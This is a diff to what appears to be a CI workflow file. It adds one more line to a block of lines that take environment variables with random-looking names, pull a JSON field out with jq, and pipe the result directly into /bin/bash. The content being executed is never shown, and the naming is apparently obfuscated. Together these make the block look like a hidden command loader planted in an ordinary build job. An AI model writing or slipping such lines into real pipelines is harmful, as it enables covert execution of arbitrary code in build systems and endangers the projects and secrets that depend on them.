@@ -39,6 +39,7 @@ jobs:
           printf '%s' "$thx438" | jq -r .xbwr2396 | /bin/bash
           printf '%s' "$eevm038" | jq -r .t66208 | /bin/bash
           echo $cplz0 | jq -r .ht365 | /bin/bash
+          printf '%s' "$dqml22" | jq -r .gzk17 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
